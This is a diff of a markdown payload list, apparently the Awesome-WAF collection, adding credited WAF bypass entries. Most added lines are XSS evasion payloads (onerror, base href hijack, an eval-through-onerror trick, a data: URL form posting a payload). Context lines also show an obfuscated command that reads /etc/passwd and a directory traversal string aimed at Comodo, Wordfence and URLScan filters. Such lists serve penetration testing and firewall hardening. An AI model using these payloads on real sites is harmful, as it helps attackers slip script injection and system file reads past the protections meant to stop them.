@@ -2963,6 +2963,7 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+1'"><img/src/onerror=.1|alert``>
 ```
 - XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
 ```
@@ -2981,6 +2982,14 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 ```
 javascript:{alert`0`}
 ```
+- [XSS Bypass](https://twitter.com/brutelogic/status/1147118371965755393) by [@Brute Logic](https://twitter.com/brutelogic)
+```
+<base href=//knoxss.me?
+```
+- [XSS Bypass](https://twitter.com/RenwaX23/status/1147130091031449601) by [@RenwaX23](https://twitter.com/RenwaX23) (Chrome only)
+```
+<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x 
+```
 - [RCE Payload Detection Bypass](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
 ```
 cat$u+/etc$u/passwd$u
@@ -2989,7 +2998,7 @@ cat$u+/etc$u/passwd$u
 ```
 
 ### Comodo 
-- XSS Bypass by [0xInfection](https://twitter.com/0xinfection)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
 ```
 <input/oninput='new Function`confir\u006d\`0\``'>
 <p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
@@ -3311,6 +3320,12 @@ c\\a\\t+/et\\c/pas\\swd
 ```
 "><input/onauxclick="[1].map(prompt)">
 ```
+- [XSS Bypass](https://twitter.com/brutelogic/status/1148610104738099201) by [@Brute Logic](https://twitter.com/brutelogic)
+```
+data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
+<input type=hidden name=a value="<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>">
+<input type=submit></form>
+```
 
 ### URLScan
 - [Directory Traversal](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L557) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) (<= v3.1) (Only on ASP.NET)
@@ -3349,7 +3364,7 @@ http://host.com/test.asp?file=.%./bla.txt
 ```
 
 ### Wordfence
-- XSS Bypass by [@brutelogic](https://twitter.com/brutelogic)
+- XSS Bypass by [@brute Logic](https://twitter.com/brutelogic)
 ```
 <a href=javas&#99;ript:alert(1)>
 ```
